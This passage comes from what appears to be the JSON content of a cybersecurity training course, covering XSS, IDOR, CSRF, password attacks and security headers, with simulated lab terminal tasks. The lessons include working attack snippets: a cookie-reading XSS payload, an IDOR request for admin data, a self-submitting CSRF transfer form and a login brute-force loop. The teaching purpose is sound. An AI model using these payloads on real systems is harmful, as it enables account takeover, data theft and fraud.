        "title": "Vulnerable HTML vs Encoded HTML",
        "codeOrDiagram": "<!-- VULNERABLE: Direct rendering -->\n<div>Welcome back, <script>alert(document.cookie)</script></div>\n\n<!-- SECURE: Context-Aware Output Encoded -->\n<div>Welcome back, &lt;script&gt;alert(document.cookie)&lt;/script&gt;</div>",
        "explanation": "Encoding `<` into `&lt;` changes the character from an HTML syntax delimiter into a harmless text glyph."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Simulate testing a search parameter for reflected XSS using curl: `curl -s \"http://localhost:8080/search?q=<script>alert('xss')</script>\" | grep -o \"<script>.*</script>\"`:",
      "initialCommand": "",
      "expectedCommand": "curl -s \"http://localhost:8080/search?q=<script>alert('xss')</script>\" | grep -o \"<script>.*</script>\"",
      "simulatedOutput": "<script>alert('xss')</script>\n[+] Alert: Raw script tags reflected without HTML entity encoding! Reflected XSS verified.",
      "explanation": "Because the raw `<script>` tags were reflected unencoded in the HTTP response, a browser would execute the payload."
    },
    "questions": [
      {
        "id": "r26-q1",
        "type": "multiple-choice",
        "question": "An attacker posts a review on a product page containing malicious JavaScript. Two days later, 5,000 customers view the product and their browsers execute the script. Which type of XSS is this?",
        "options": [
          "Reflected XSS",
          "Stored XSS (Persistent XSS)",
          "SQL Injection",
          "ARP Poisoning"
        ],
        "correctIndex": 1,
        "explanation": "Because the payload was stored in the database and executed by future visitors, this is Stored (Persistent) XSS."
      },
      {
        "id": "r26-q2",
        "type": "multiple-choice",
        "question": "If an application sets the `HttpOnly` flag on its session cookies, does this eliminate all danger from XSS vulnerabilities?",
        "options": [
          "Yes, XSS can do nothing without cookies",
          "No; while it prevents JavaScript from reading `document.cookie`, XSS can still log keystrokes, perform actions on behalf of the user, rewrite the page, and redirect users to phishing sites",
          "Yes, because HttpOnly disables JavaScript in the browser",
          "No, because HttpOnly only works on Android"
        ],
        "correctIndex": 1,
        "explanation": "HttpOnly protects the session cookie from direct theft, but an attacker with XSS can still force the browser to perform unauthorized transactions (like transferring funds)."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Detect Reflected XSS Reflection",
        "instruction": "Execute `curl -s \"http://localhost:8080/search?q=<script>alert('xss')</script>\" | grep -o \"<script>.*</script>\"` to test reflection.",
        "hints": [
          "Concept: Probe input reflection in HTTP response.",
          "Direction: Send script tags in search query.",
          "Tool: `curl` and `grep`",
          "Syntax: Run the complete curl pipeline.",
          "Explanation: Confirms unencoded reflection."
        ]
      }
    ],
    "explainResult": "The application echoed the `q` query string parameter directly into the response HTML body without calling `htmlspecialchars()` or HTML entity encoding.",
    "securityConnection": "XSS is frequently used by cyber criminals to deploy 'Virtual Credit Card Skimmers' (Magecart attacks) on checkout pages, stealing credit card numbers in real-time as victims type them into form fields.",
    "practicalRoomLink": {
      "label": "Ready for hands-on practice?",
      "buttonText": "Open Practical Cross-Site Scripting Lab",
      "url": "labs.html?lab=xss"
    },
    "completion": {
      "learned": [
        "How browsers execute injected JavaScript via XSS",
        "The differences between Reflected, Stored, and DOM-based XSS",
        "The security impact of client-side execution",
        "Defenses: Context-aware output encoding, CSP, and HttpOnly cookies"
      ],
      "practiced": [
        "curl -s \"http://localhost:8080/search?q=...\"",
        "Verifying HTML reflection",
        "Evaluating XSS mitigation techniques"
      ]
    },
    "nextRoomId": "room-27"
  },
  {
    "id": "room-27",
    "stage": 6,
    "stageTitle": "Stage 6 — Web Security",
    "title": "Access Control & IDOR",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "estimatedTime": "35 min",
    "prerequisites": "Room 16 (Authentication & Authorization) & Room 23 (Web Security Fundamentals)",
    "whyAreYouHere": "In 2018, a security researcher discovered that by changing the number in the URL of a major airline app from `invoice/1001` to `invoice/1002`, they could view any passenger's boarding pass, passport details, and travel itinerary! This is **Insecure Direct Object Reference (IDOR)**, a subset of Broken Access Control (the #1 flaw on the OWASP Top 10). In this room, you will learn how IDOR occurs and how to implement proper authorization checks.",
    "objectives": [
      "Understand what Direct Object References are (e.g. database primary keys in URLs)",
      "Learn the difference between Horizontal Privilege Escalation and Vertical Privilege Escalation",
      "Understand why relying on parameter obscurity or client-side checks fails",
      "Learn how to audit REST APIs for IDOR vulnerabilities",
      "Implement server-side authorization validation to prevent unauthorized access"
    ],
    "vocabulary": [
      {
        "term": "IDOR (Insecure Direct Object Reference)",
        "definition": "A vulnerability where an application exposes a reference to an internal implementation object (such as a database ID or filename) without validating whether the requesting user has authorization."
      },
      {
        "term": "Horizontal Privilege Escalation",
        "definition": "When an attacker accesses data or functions belonging to another user who holds the exact same privilege tier (e.g. User A views User B's profile)."
      },
      {
        "term": "Vertical Privilege Escalation",
        "definition": "When a standard low-privilege user accesses functionality or data reserved for higher-privilege administrative tiers."
      },
      {
        "term": "GUID / UUID",
        "definition": "Globally Unique Identifier: a 128-bit random number (e.g. `f47ac10b-58cc-4372-a567-0e02b2c3d479`) that prevents sequential enumeration of database records."
      }
    ],
    "lessons": [
      {
        "title": "1. The Anatomy of an IDOR Flaw",
        "content": "When you view your medical record, the web app requests:\n`GET /api/records?patient_id=4092 HTTP/1.1`\nCookie: session=Alice\n\nWhat happens if Alice changes the number to `4093`?\n• **Vulnerable Application**: Looks up `patient_id = 4093` and returns Bob's medical file! The code checked that Alice was logged in, but **never checked if Alice owns record 4093**.\n• **Secure Application**: Checks:\n`WHERE record_id = 4093 AND patient_id = current_session.user_id`\nIf they don't match, return `403 Forbidden`!"
      },
      {
        "title": "2. Horizontal vs Vertical Escalation",
        "content": "• **Horizontal**: You are User 102. You change the URL to User 103 to read another student's exam score. Both are students.\n• **Vertical**: You are User 102 (student). You change the URL parameter to `role=admin` or access `/admin/delete_user` to execute actions reserved for the university dean!"
      }
    ],
    "seeExamples": [
      {
        "title": "Vulnerable vs Secure REST API Endpoint",
        "codeOrDiagram": "// VULNERABLE: Direct access with no authorization check\napp.get('/api/invoice/:id', (req, res) => {\n  const invoice = db.find({ id: req.params.id });\n  return res.json(invoice); // Anyone who knows the ID gets the invoice!\n});\n\n// SECURE: Strict server-side ownership verification\napp.get('/api/invoice/:id', (req, res) => {\n  const invoice = db.find({ id: req.params.id, userId: req.user.id });\n  if (!invoice) return res.status(403).json({ error: \"Access Denied\" });\n  return res.json(invoice);\n});",
        "explanation": "The secure implementation binds the query to the authenticated `req.user.id`, preventing cross-account access."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Simulate an IDOR exploit by requesting user account 100 instead of your own account (102): `curl -s -H \"Cookie: session=cadet_102\" http://localhost:8080/api/users/100`:",
      "initialCommand": "",
      "expectedCommand": "curl -s -H \"Cookie: session=cadet_102\" http://localhost:8080/api/users/100",
      "simulatedOutput": "HTTP/1.1 200 OK\n{\n  \"user_id\": 100,\n  \"name\": \"System Administrator\",\n  \"email\": \"admin@endlessus.in\",\n  \"api_secret\": \"sec_flag_idor_broken_access_992\"\n}\n[+] Success! IDOR confirmed: Cadet user accessed Administrator profile.",
      "explanation": "The backend verified the session cookie was valid, but failed to ensure cadet_102 had permission to read user_id 100."
    },
    "questions": [
      {
        "id": "r27-q1",
        "type": "multiple-choice",
        "question": "What is the fundamental flaw that enables Insecure Direct Object References (IDOR)?",
        "options": [
          "The database is missing an index",
          "The application exposes an object identifier (like an ID in the URL) but fails to perform server-side authorization checks verifying that the requesting user owns that object",
          "The website does not use HTTPS",
          "The user's password was too short"
        ],
        "correctIndex": 1,
        "explanation": "IDOR occurs when an application trusts user-supplied direct object references without server-side access control validation."
      },
      {
        "id": "r27-q2",
        "type": "multiple-choice",
        "question": "Which of the following is considered Horizontal Privilege Escalation?",
        "options": [
          "A regular customer views another regular customer's order history",
          "A regular customer upgrades their account to full system administrator",
          "A hacker gains root access to the underlying Linux server",
          "A database user drops all tables"
        ],
        "correctIndex": 0,
        "explanation": "Horizontal escalation occurs between peers on the same privilege level (customer accessing another customer's data)."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Exploit IDOR Parameter Manipulation",
        "instruction": "Use curl with `session=cadet_102` to extract user 100's record.",
        "hints": [
          "Concept: Parameter tampering with direct object reference.",
          "Direction: Send GET to `/api/users/100`.",
          "Tool: `curl`",
          "Syntax: `curl -s -H \"Cookie: session=cadet_102\" http://localhost:8080/api/users/100`",
          "Explanation: Returns admin data."
        ]
      }
    ],
    "explainResult": "The endpoint directly routed the route parameter `:id` into the query object without comparing it to the session principal.",
    "securityConnection": "Broken Access Control is currently ranked **#1 on the OWASP Top 10**. Penetration testers systematically map out all integer and GUID parameters in an application to test whether incrementing numbers or swapping IDs exposes data belonging to other tenants.",
    "practicalRoomLink": {
      "label": "Ready for hands-on practice?",
      "buttonText": "Open Practical IDOR Lab",
      "url": "labs.html?lab=idor"
    },
    "completion": {
      "learned": [
        "The mechanics of Insecure Direct Object References (IDOR)",
        "Horizontal vs Vertical Privilege Escalation",
        "Why GUIDs/UUIDs alone are not a substitute for authorization",
        "Implementing server-side authorization verification"
      ],
      "practiced": [
        "curl -H \"Cookie: ...\" /api/users/100",
        "Auditing REST API access controls",
        "Verifying session ownership bounds"
      ]
    },
    "nextRoomId": "room-28"
  },
  {
    "id": "room-28",
    "stage": 6,
    "stageTitle": "Stage 6 — Web Security",
    "title": "CSRF, Cookies & SameSite Defense",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "estimatedTime": "35 min",
    "prerequisites": "Room 13 (Cookies & Sessions) & Room 23 (Web Security Fundamentals)",
    "whyAreYouHere": "Imagine you are logged into your online bank. In another browser tab, you visit a recipe blog. Without your knowledge, the recipe blog secretly submits a form in the background to your bank: *Transfer $1,000 to Attacker*. Because your browser automatically includes your valid session cookies with every request to the bank, the bank processes the transfer! This is **Cross-Site Request Forgery (CSRF)**. In this room, you will learn how CSRF works and how Anti-CSRF tokens and SameSite cookies stop it.",
    "objectives": [
      "Understand Ambient Authority and why browsers automatically send session cookies",
      "Learn the mechanics of Cross-Site Request Forgery (CSRF)",
      "Understand why GET requests should NEVER alter server state",
      "Master the Anti-CSRF Token defense mechanism (Synchronizer Token Pattern)",
      "Understand the `SameSite` cookie attribute values: `Strict`, `Lax`, and `None`"
    ],
    "vocabulary": [
      {
        "term": "CSRF (Cross-Site Request Forgery)",
        "definition": "An attack that forces an authenticated user's browser to execute unwanted actions on a trusted web application without their consent."
      },
      {
        "term": "Ambient Authority",
        "definition": "A security design where credentials (like cookies or IP addresses) are automatically attached by the system without explicit user intention."
      },
      {
        "term": "Anti-CSRF Token",
        "definition": "A unique, unpredictable, secret value generated by the server and associated with the user's current session, verified on state-changing requests."
      },
      {
        "term": "SameSite=Strict",
        "definition": "Cookie attribute that blocks the cookie from being sent in all cross-site browsing contexts, even following regular external links."
      },
      {
        "term": "SameSite=Lax",
        "definition": "Cookie attribute that allows cookies on top-level safe GET navigations (e.g. clicking a link), but blocks them on cross-site POSTs or images."
      }
    ],
    "lessons": [
      {
        "title": "1. The Recipe Blog Attack",
        "content": "How a CSRF exploit works:\n1. Victim logs into `mybank.com`. The browser stores `Cookie: session=ValidSession123`.\n2. Victim opens `evil-recipe.com` in another tab.\n3. The evil page contains hidden HTML that auto-submits on load:\n```html\n<form action=\"https://mybank.com/transfer\" method=\"POST\" id=\"csrfForm\">\n  <input type=\"hidden\" name=\"to\" value=\"AttackerAccount\">\n  <input type=\"hidden\" name=\"amount\" value=\"1000\">\n</form>\n<script>document.getElementById('csrfForm').submit();</script>\n```\n4. Because the request is heading to `mybank.com`, the victim's browser automatically attaches `session=ValidSession123`!\nThe bank cannot tell whether the victim clicked 'Transfer' or if the recipe blog forced the click."
      },
      {
        "title": "2. The Modern Defense: Anti-CSRF Tokens & SameSite",
        "content": "• **Anti-CSRF Tokens**: The bank generates a random secret token (e.g. `csrf_token=9a8f2...`) and embeds it inside the real transfer form. The evil recipe blog cannot read this token because browsers enforce the Same-Origin Policy (SOP). When the form submits without the valid token, the server rejects it!\n• **SameSite=Lax/Strict Cookies**: Modern browsers do not attach SameSite cookies to cross-origin form submissions, stopping the attack at the browser layer!"
      }
    ],
    "seeExamples": [
      {
        "title": "Anti-CSRF Token Validation Flow",
        "codeOrDiagram": "[ Genuine Bank Form ]\n<form action=\"/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"csrf_token\" value=\"secret_random_token_xyz\">\n  <button type=\"submit\">Transfer</button>\n</form>\n\n[ Server Verification ]\nif (req.body.csrf_token !== session.expected_token) {\n  return res.status(403).send(\"CSRF Attack Detected!\");\n}",
        "explanation": "Because an external site cannot read the victim's CSRF token, any forged request will be missing the valid token."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Simulate submitting a state-changing money transfer request without an Anti-CSRF token using curl: `curl -d \"to=attacker&amount=500\" http://localhost:8080/api/transfer`:",
      "initialCommand": "",
      "expectedCommand": "curl -d \"to=attacker&amount=500\" http://localhost:8080/api/transfer",
      "simulatedOutput": "HTTP/1.1 403 Forbidden\n{\"error\":\"CSRF_TOKEN_MISSING\",\"message\":\"State-changing operation rejected. Missing Anti-CSRF token.\"}\n[+] Success! The server successfully detected and blocked the forged request.",
      "explanation": "The server inspected the payload, found no matching Anti-CSRF token, and safely rejected the transaction with HTTP 403."
    },
    "questions": [
      {
        "id": "r28-q1",
        "type": "multiple-choice",
        "question": "Why does an Anti-CSRF token prevent external third-party websites from executing forged requests against a victim's bank?",
        "options": [
          "Because third-party websites cannot use HTTPS",
          "Because the Same-Origin Policy prevents the external attacker's website from reading the random secret token from the victim's bank page",
          "Because Anti-CSRF tokens reboot the server every 5 seconds",
          "Because tokens can only be typed on physical keyboards"
        ],
        "correctIndex": 1,
        "explanation": "Due to the browser's Same-Origin Policy, an external website cannot read content from another origin, meaning it cannot know or guess the valid token."
      },
      {
        "id": "r28-q2",
        "type": "multiple-choice",
        "question": "Which cookie attribute ensures that a session cookie will NOT be sent on cross-site POST form submissions, defending against CSRF?",
        "options": [
          "SameSite=Lax (or SameSite=Strict)",
          "Path=/",
          "Domain=localhost",
          "Max-Age=3600"
        ],
        "correctIndex": 0,
        "explanation": "`SameSite=Lax` and `SameSite=Strict` instruct the browser not to attach the cookie to cross-origin form submissions or requests."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Verify Anti-CSRF Token Enforcement",
        "instruction": "Submit `curl -d \"to=attacker&amount=500\" http://localhost:8080/api/transfer` to confirm the defense is active.",
        "hints": [
          "Concept: Test Anti-CSRF protection.",
          "Direction: Submit transfer without csrf_token parameter.",
          "Tool: `curl`",
          "Syntax: `curl -d \"to=attacker&amount=500\" http://localhost:8080/api/transfer`",
          "Explanation: Expect HTTP 403 Forbidden."
        ]
      }
    ],
    "explainResult": "The endpoint middleware verified the presence of `X-CSRF-Token` or form token, failed to match against the session store, and halted execution.",
    "securityConnection": "CSRF vulnerabilities have historically allowed attackers to silently change user email addresses, alter Wi-Fi router DNS servers, or trigger unauthorized financial transactions simply by having the victim view an image on a forum.",
    "practicalRoomLink": {
      "label": "Ready for hands-on practice?",
      "buttonText": "Open Practical Cross-Site Request Forgery Lab",
      "url": "labs.html?lab=csrf"
    },
    "completion": {
      "learned": [
        "The mechanics of Cross-Site Request Forgery (CSRF)",
        "The concept of ambient cookie authority in web browsers",
        "The Synchronizer Anti-CSRF Token defense pattern",
        "The role of SameSite cookie attributes (Strict, Lax, None)"
      ],
      "practiced": [
        "curl -d \"to=attacker...\"",
        "Verifying CSRF token validation",
        "Analyzing cross-origin cookie behaviors"
      ]
    },
    "nextRoomId": "room-29"
  },
  {
    "id": "room-29",
    "stage": 6,
    "stageTitle": "Stage 6 — Web Security",
    "title": "Authentication Security & Password Attacks",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "estimatedTime": "35 min",
    "prerequisites": "Room 16 (Authentication & Authorization) & Room 23 (Web Security Fundamentals)",
    "whyAreYouHere": "Passwords remain the primary mechanism for identity verification on the internet, which makes authentication portals the #1 target for automated brute-force attacks. If an application allows infinite login guesses without delay or lockout, any account with a standard password will eventually fall. In this room, you will learn the differences between Dictionary Attacks, Brute Force, and Credential Stuffing, and how rate limiting and account lockouts protect users.",
    "objectives": [
      "Differentiate between Brute-Force Attacks, Dictionary Attacks, and Password Spraying",
      "Understand why sequential account lockouts can lead to Denial of Service",
      "Learn adaptive Rate Limiting and progressive throttling (exponential backoff)",
      "Master password hashing requirements: Salt, Work Factor, and algorithms (bcrypt, Argon2)",
      "Simulate password dictionary cracking against an authentication endpoint"
    ],
    "vocabulary": [
      {
        "term": "Brute-Force Attack",
        "definition": "Systematically trying every possible combination of characters (a, b, c... aa, ab) until the correct password is found."
      },
      {
        "term": "Dictionary Attack",
        "definition": "Testing passwords from a pre-compiled wordlist of commonly used passwords (like `rockyou.txt` or company-specific lists)."
      },
      {
        "term": "Password Spraying",
        "definition": "Testing one single common password (like `Summer2026!`) against thousands of user accounts to avoid triggering lockout thresholds."
      },
      {
        "term": "Salt",
        "definition": "A unique, cryptographically random string appended to each password before hashing to ensure identical passwords produce completely different hashes."
      },
      {
        "term": "Rate Limiting",
        "definition": "Restricting the number of requests a client can make to a specific endpoint within a defined window of time."
      }
    ],
    "lessons": [
      {
        "title": "1. The Password Attack Spectrum",
        "content": "• **Dictionary Attack**: Tries 100,000 common passwords against user `alice`.\n  - *Defense*: Account locks after 5 attempts.\n• **Password Spraying**: Tries `Welcome2026!` against 10,000 different user accounts (1 attempt per user).\n  - *Result*: Locks out nobody, but successfully cracks the 2-3% of users who chose that seasonal password!\n• **Offline Hash Cracking**: Attacker steals the database hash dump and runs billions of guesses per second on local GPU rigs using Hashcat."
      },
      {
        "title": "2. Password Hashing: Why MD5/SHA-256 is Broken for Passwords",
        "content": "Standard cryptographic hashes (SHA-256) are designed to be **fast** (calculating billions of hashes per second for file integrity).\nFor passwords, you want the hash to be **deliberately slow and computationally expensive**!\nModern password algorithms (**bcrypt**, **Argon2id**, **PBKDF2**) include:\n1. **Work Factor (Cost)**: Tunable CPU/memory cost that makes GPU guessing slow.\n2. **Salt**: Automatically generated random bytes that defeat pre-computed Rainbow Tables."
      }
    ],
    "seeExamples": [
      {
        "title": "Salted Hash Transformation",
        "codeOrDiagram": "Password: \"Secret123\"\nSalt:     \"x8A19zQ!\" (Randomly generated for Alice)\nStored in DB: $2b$12$x8A19zQ!h8fa9z... (bcrypt format)\n\nBob ALSO has password: \"Secret123\"\nSalt:     \"m3K01vL?\" (Randomly generated for Bob)\nStored in DB: $2b$12$m3K01vL?p9w12c... (Completely different hash!)",
        "explanation": "Even though Alice and Bob have the exact same password, unique salts ensure their stored hashes look completely different."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Simulate testing a wordlist against the lab login API until the correct password is identified: `for p in admin 123456 password dragon letmein; do echo -n \"$p: \"; curl -s -d \"user=cadet&pass=$p\" http://localhost:8080/login | grep -o '\"message\":[^,]*'; done`:",
      "initialCommand": "",
      "expectedCommand": "for p in admin 123456 password dragon letmein; do echo -n \"$p: \"; curl -s -d \"user=cadet&pass=$p\" http://localhost:8080/login | grep -o '\"message\":[^,]*'; done",
      "simulatedOutput": "admin: \"message\":\"Invalid credentials\"\n123456: \"message\":\"Invalid credentials\"\npassword: \"message\":\"Invalid credentials\"\ndragon: \"message\":\"Invalid credentials\"\nletmein: \"message\":\"Login successful. Session established.\"\n[+] Success! Valid password 'letmein' recovered via dictionary iteration.",
      "explanation": "Automating HTTP submissions with shell loops or tools like Hydra / ffuf tests multiple candidates quickly."
    },
    "questions": [
      {
        "id": "r29-q1",
        "type": "multiple-choice",
        "question": "Why should developers use slow hashing algorithms like bcrypt or Argon2 instead of fast algorithms like SHA-256 for storing user passwords?",
        "options": [
          "Because bcrypt uses less hard drive space",
          "Because fast algorithms allow attackers with modern GPU cracking rigs to test billions of guesses per second, whereas slow algorithms make offline cracking computationally infeasible",
          "Because SHA-256 can only hash numbers, not letters",
          "Because bcrypt is open-source while SHA-256 is proprietary"
        ],
        "correctIndex": 1,
        "explanation": "Slow hashing algorithms enforce high computational and memory costs, slowing offline GPU dictionary attacks to a crawl."
      },
      {
        "id": "r29-q2",
        "type": "multiple-choice",
        "question": "What is the primary objective of an attacker performing a 'Password Spraying' attack instead of a traditional brute-force attack?",
        "options": [
          "To test millions of complex passwords against the CEO's account",
          "To test a single commonly used password against thousands of distinct user accounts, staying below account lockout thresholds",
          "To overflow the web server's memory buffer",
          "To change the DNS records of the target domain"
        ],
        "correctIndex": 1,
        "explanation": "Password spraying avoids triggering account lockout policies by testing only 1 or 2 attempts per user before moving on."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Execute Dictionary Login Probe",
        "instruction": "Run the shell dictionary loop against the login API to identify the valid password.",
        "hints": [
          "Concept: Automated dictionary testing.",
          "Direction: Loop through passwords until HTTP 200.",
          "Tool: Bash loop with `curl`",
          "Syntax: Run the provided multi-password loop.",
          "Explanation: Isolates valid credential."
        ]
      }
    ],
    "explainResult": "The script submitted sequential POST requests. The fifth candidate matched the bcrypt hash stored in the user record, returning a valid session token.",
    "securityConnection": "Credential attacks account for over 80% of all web breaches. Implementing Multi-Factor Authentication (MFA), enforcing NIST 800-63B password complexity standards, and deploying rate-limiting with CAPTCHA are core responsibilities of security engineering.",
    "practicalRoomLink": {
      "label": "Ready for hands-on practice?",
      "buttonText": "Open Practical Authentication & Brute Force Lab",
      "url": "labs.html?lab=auth"
    },
    "completion": {
      "learned": [
        "The mechanics of Brute Force, Dictionary, and Password Spraying attacks",
        "Why fast hashing (MD5, SHA-256) is dangerous for passwords",
        "The role of Salts and Work Factors in bcrypt and Argon2",
        "Defenses: Rate limiting, exponential backoff, and MFA"
      ],
      "practiced": [
        "Automated dictionary testing via curl",
        "Analyzing authentication response patterns",
        "Evaluating password storage architectures"
      ]
    },
    "nextRoomId": "room-30"
  },
  {
    "id": "room-30",
    "stage": 6,
    "stageTitle": "Stage 6 — Web Security",
    "title": "HTTP Security Headers & Browser Defenses",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "estimatedTime": "30 min",
    "prerequisites": "Room 12 (HTTP Fundamentals) & Room 26 (Cross-Site Scripting)",
    "whyAreYouHere": "You now understand how web applications operate and how vulnerabilities like XSS, Clickjacking, and Session Theft arise. But did you know that the server can instruct the user's browser to activate built-in security shields? By sending specific **HTTP Security Headers**, a web server can block malicious scripts, enforce HTTPS connections, and prevent Clickjacking with zero client plugins! In this room, you will master CSP, HSTS, X-Frame-Options, and X-Content-Type-Options.",
    "objectives": [
      "Understand Defense-in-Depth and the role of browser security headers",
      "Master Content Security Policy (CSP): restricting script sources and preventing XSS",
      "Learn HTTP Strict Transport Security (HSTS): eliminating SSL stripping and downgrade attacks",
      "Prevent Clickjacking using `X-Frame-Options` and `frame-ancestors`",
      "Audit and grade security headers on a live web server"
    ],
    "vocabulary": [
      {
        "term": "HTTP Security Header",
        "definition": "A response header sent by a web server that instructs the client browser to enable specific security policies and defenses."
      },
      {
        "term": "CSP (Content Security Policy)",
        "definition": "A powerful HTTP header that restricts the domains from which scripts, styles, images, and other resources can be loaded or executed."
      },
      {
        "term": "HSTS (Strict-Transport-Security)",
        "definition": "A header that forces the browser to communicate exclusively over encrypted HTTPS, never allowing unencrypted HTTP fallbacks."
      },
      {
        "term": "Clickjacking",
        "definition": "A malicious technique of tricking a user into clicking something different from what they perceive, typically using transparent iframes."
      },
      {
        "term": "X-Frame-Options",
        "definition": "A header (`DENY` or `SAMEORIGIN`) that prevents a web page from being rendered inside an `<iframe>` on an external site."
      },
      {
        "term": "X-Content-Type-Options: nosniff",
        "definition": "A header that prevents browsers from MIME-sniffing a response away from the declared Content-Type."
      }
    ],
    "lessons": [
      {
        "title": "1. The Essential Four Headers",
        "content": "Every modern production web application should send these four headers:\n1. **Content-Security-Policy**:\n   `Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com;`\n   Blocks any inline scripts (`<script>alert(1)</script>`) or external scripts injected by attackers!\n2. **Strict-Transport-Security (HSTS)**:\n   `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`\n   Tells the browser: *\"Remember for 1 year to NEVER connect to this domain over HTTP, even if the user types http://.\"*\n3. **X-Frame-Options**:\n   `X-Frame-Options: DENY`\n   Prevents malicious websites from framing your login page inside a transparent iframe (Clickjacking defense).\n4. **X-Content-Type-Options**:\n   `X-Content-Type-Options: nosniff`\n   Stops browsers from executing an uploaded image file as executable HTML or JavaScript."
      }
    ],
    "seeExamples": [
      {
        "title": "Auditing Headers with curl -I",
        "codeOrDiagram": "cadet@endlessus:~$ curl -I https://endlessus.in\nHTTP/2 200 \nserver: GitHub.com\ncontent-type: text/html; charset=utf-8\nstrict-transport-security: max-age=31536000\nx-content-type-options: nosniff\nx-frame-options: DENY\nreferrer-policy: strict-origin-when-cross-origin",
        "explanation": "Notice the security posture: HSTS enforces HTTPS, X-Frame-Options blocks framing, and nosniff prevents MIME confusion."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Audit the HTTP response headers of our lab server using `curl -I http://localhost:8080` to identify missing security headers:",
      "initialCommand": "",
      "expectedCommand": "curl -I http://localhost:8080",
      "simulatedOutput": "HTTP/1.1 200 OK\nServer: Apache/2.4.52\nContent-Type: text/html\n[!] Warning: Missing Content-Security-Policy!\n[!] Warning: Missing Strict-Transport-Security!\n[!] Warning: Missing X-Frame-Options! Vulnerable to Clickjacking.\n[+] Success! Security header audit complete. Grade: F (Insecure configuration).",
      "explanation": "Using `curl -I` allows security auditors to rapidly evaluate an organization's defense-in-depth header posture."
    },
    "questions": [
      {
        "id": "r30-q1",
        "type": "multiple-choice",
        "question": "An attacker creates a malicious webpage that loads an online banking transfer form inside a completely invisible, transparent `<iframe>` overlaid directly on top of a 'Click here to win a free iPhone' button. What attack is being performed?",
        "options": [
          "SQL Injection",
          "Clickjacking (UI Redressing)",
          "Buffer Overflow",
          "ARP Spoofing"
        ],
        "correctIndex": 1,
        "explanation": "Clickjacking uses transparent iframes to trick users into clicking buttons they cannot see. It is mitigated by `X-Frame-Options: DENY`."
      },
      {
        "id": "r30-q2",
        "type": "multiple-choice",
        "question": "Which HTTP header instructs the browser to never execute inline scripts or load JavaScript from unauthorized external domains?",
        "options": [
          "Content-Security-Policy (CSP)",
          "Server",
          "Accept-Encoding",
          "User-Agent"
        ],
        "correctIndex": 0,
        "explanation": "Content Security Policy (CSP) defines approved sources for executable scripts, stylesheets, and images."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Audit Target Security Headers",
        "instruction": "Execute `curl -I http://localhost:8080` to inspect which defensive headers are configured.",
        "hints": [
          "Concept: HTTP header posture evaluation.",
          "Direction: Use the `-I` head flag with curl.",
          "Tool: `curl`",
          "Syntax: `curl -I http://localhost:8080`",
          "Explanation: Checks for CSP, HSTS, and X-Frame-Options."
        ]
      }
    ],
    "explainResult": "The `curl` command parsed the response headers returned by the Apache server, exposing the total absence of browser security controls.",
    "securityConnection": "Security header auditing is an automated part of every penetration test and compliance audit. Tools like Mozilla Observatory or `securityheaders.com` grade domains from A+ to F based on their header configuration.",
    "practicalRoomLink": {
      "label": "Ready for hands-on practice?",
      "buttonText": "Open Practical HTTP Security Headers Lab",
      "url": "labs.html?lab=headers"
    },
    "completion": {
      "learned": [
        "The concept of Defense-in-Depth via browser security headers",
        "Restricting script injection with Content-Security-Policy (CSP)",
        "Enforcing encrypted connections using HSTS",
        "Mitigating Clickjacking with X-Frame-Options"
      ],
      "practiced": [
        "curl -I",
        "Auditing security header configurations",
        "Evaluating browser security postures"
      ]
    },
    "nextRoomId": "room-31"
  },
  {
    "id": "room-31",
    "stage": 7,
    "stageTitle": "Stage 7 — Linux Security",
    "title": "Linux Privilege Escalation: SUID & Sudo",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "estimatedTime": "40 min",
    "prerequisites": "Room 05 (Linux Permissions) & Stage 5 (Security Tools)",
    "whyAreYouHere": "When an attacker exploits a web vulnerability (like a web shell or remote code execution), they rarely land as the supreme administrator (`root`). Instead, they land as an unprivileged service account like `www-data` or `cadet`. To gain full control of the machine, they must escalate their privileges! In this room, you will learn the mechanics of Linux Privilege Escalation, focusing on Setuid (SUID) binaries and misconfigured sudo rules.",
    "objectives": [
      "Understand the Privilege Escalation lifecycle (Foothold -> Enumeration -> Exploitation -> Root)",
      "Understand the SUID (Set User ID) permission bit and why it exists",
      "Scan the entire filesystem for misconfigured SUID binaries using the `find` command",
      "Learn the GTFOBins methodology for turning legitimate system binaries into root shells",
      "Escalate from user `cadet` to `root` using an interactive terminal sandbox"
    ],
    "vocabulary": [
      {
        "term": "Privilege Escalation (Privesc)",
        "definition": "The act of exploiting a bug, design flaw, or configuration error to gain elevated access to resources normally protected from an application or user."
      },
      {
        "term": "SUID (Set User ID)",
        "definition": "A special Linux file permission bit that allows a program to execute with the privileges of the file owner (usually root) rather than the user running it."
      },
      {
        "term": "SGID (Set Group ID)",
        "definition": "Similar to SUID, but executes with the permissions of the file's group owner."
      },
      {
        "term": "GTFOBins",
        "definition": "A curated open-source repository of Unix binaries that can be exploited by an attacker to bypass local security restrictions and escalate privileges."
      },
      {
        "term": "sudo (Superuser Do)",
        "definition": "A program that allows a permitted user to execute a command as superuser or another user, as specified by the security policy."
      }
    ],
    "lessons": [
      {
        "title": "1. The Purpose and Danger of SUID",
